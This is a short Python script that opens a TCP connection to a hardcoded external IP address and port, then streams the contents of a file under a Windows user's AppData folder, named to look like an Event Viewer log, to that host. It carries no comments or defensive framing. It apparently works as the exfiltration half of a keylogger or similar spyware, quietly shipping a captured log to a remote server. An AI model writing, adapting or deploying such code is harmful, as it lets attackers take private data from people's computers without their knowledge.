import socket
import os

HOST = "51.191.145.49"
PORT = 5005
file = "C:/Users/HyperNova/AppData/Local/EventViewer.txt"
connectionTries = 0
socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while connectionTries < 5:
    try:
        socket1.connect((HOST, PORT))
    except:
        connectionTries += 1
        continue
    try:
        with open(file, 'rb') as f:
            data = f.read(1024)
            while (data):
                socket1.send(data)
                data = f.read(1024)
        socket1.close()
        break
    except:
        break
